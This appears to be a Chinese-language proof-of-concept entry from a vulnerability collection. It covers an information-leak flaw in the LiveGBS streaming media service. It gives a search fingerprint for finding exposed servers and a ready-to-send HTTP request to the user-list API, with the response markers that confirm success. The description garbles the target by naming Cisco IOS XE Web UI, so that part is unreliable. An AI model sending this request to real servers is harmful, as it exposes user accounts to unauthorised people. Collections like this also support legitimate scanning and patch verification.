﻿# LiveGBS 流媒体服务 信息泄漏

> 更新时间：2024-05-07

> 漏洞编号：

> 漏洞说明：LiveGBS list接口处存在逻辑缺陷漏洞，当Cisco IOS XE Web UI在互联网公开时，恶意攻击者可能会利用此漏洞访问系统敏感资源，使服器处于继不安全的状态  

> 漏洞特征：icon_hash="-206100324"

> 验证脚本：HTTP

```
GET /api/v1/user/list?q=&start=0&limit=100&enable=&sort=CreatedAt&order=desc HTTP/1.1
Accept: */*
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
X-Requested-With: XMLHttpRequest
```

> 响应代码特征：200

> 响应内容特征：Username

> 上传文件定位：

> 验证文件来源：LiveGBS 流媒体服务 信息泄漏.poc

